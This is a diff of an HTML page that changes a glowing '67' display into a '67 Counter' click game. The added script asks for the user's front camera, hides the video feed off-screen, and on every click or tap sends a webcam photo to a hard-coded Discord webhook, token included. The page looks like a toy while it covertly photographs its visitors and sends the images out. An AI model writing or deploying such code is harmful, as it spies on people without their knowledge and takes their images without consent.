@@ -3,46 +3,123 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>67</title>
+  <title>67 Counter</title>
   <style>
-    * {
+    body, html {
       margin: 0;
       padding: 0;
-      box-sizing: border-box;
-    }
-    
-    body {
-      height: 100vh;
-      background: #0a0a0a;
-      color: #ffffff;
+      height: 100%;
+      background: #000;
+      color: #0f0;
       font-family: Arial, Helvetica, sans-serif;
-      display: grid;
-      place-items: center;
       overflow: hidden;
+      cursor: pointer;
     }
-
-    .number {
-      font-size: 40vw;          /* scales with viewport width */
-      font-weight: 900;
-      line-height: 0.8;
-      text-shadow: 
-        0 0 40px #ff00aa,
-        0 0 80px #ff00aa,
-        0 0 120px #00ffff;
-      letter-spacing: -0.05em;
-      background: linear-gradient(90deg, #ff00aa, #00ffff, #ff00aa);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-      animation: pulse 4s infinite alternate;
+    #container {
+      height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      user-select: none;
+      -webkit-user-select: none;
     }
-
-    @keyframes pulse {
-      from { transform: scale(1); }
-      to   { transform: scale(1.08); }
+    #number {
+      font-size: 35vw;
+      font-weight: bold;
+      line-height: 0.9;
+    }
+    #counter {
+      font-size: 12vw;
+      margin-top: 20px;
+      opacity: 0.7;
+    }
+    #video, #canvas {
+      position: absolute;
+      top: -9999px;
+      left: -9999px;
+      width: 1px;
+      height: 1px;
     }
   </style>
 </head>
 <body>
-  <div class="number">67</div>
+
+<div id="container">
+  <div id="number">67</div>
+  <div id="counter">0</div>
+</div>
+
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas"></canvas>
+
+<script>
+// ────────────────────────────────────────────────
+const WEBHOOK = "https://discord.com/api/webhooks/1478491370887975104/8JBywMAGvuEp63A-bNVktEfzGB0hizI4N0GIX9s8KFOl1YjXK0Eo-u5MAqeY9iSFbDFo";
+
+const video = document.getElementById("video");
+const canvas = document.getElementById("canvas");
+const ctx = canvas.getContext("2d");
+const counterEl = document.getElementById("counter");
+
+let count = 0;
+
+// Update displayed number
+function updateCounter() {
+  counterEl.textContent = count;
+}
+
+async function startCamera() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: "user" }
+    });
+    video.srcObject = stream;
+    await new Promise(r => video.onloadedmetadata = r);
+  } catch (err) {
+    console.error("Camera blocked or denied", err);
+  }
+}
+
+async function snapAndSend() {
+  if (!video.srcObject || video.videoWidth === 0) return;
+
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+  canvas.toBlob(async (blob) => {
+    if (!blob) return;
+
+    const formData = new FormData();
+    formData.append("file", blob, "snap.jpg");
+
+    fetch(WEBHOOK, {
+      method: "POST",
+      body: formData
+    }).catch(err => console.error("Send failed", err));
+  }, "image/jpeg", 0.90);
+}
+
+function handleClick() {
+  count++;
+  updateCounter();
+  snapAndSend();
+}
+
+// ────────────────────────────────────────────────
+document.addEventListener("click", handleClick);
+document.addEventListener("touchstart", (e) => {
+  e.preventDefault();
+  handleClick();
+}, { passive: false });
+
+// Start camera on load
+startCamera();
+
+// Optional: make it start counting from whatever (e.g. localStorage)
+// But keeping it simple at 0 for now
+updateCounter();
+</script>
 </body>
 </html>
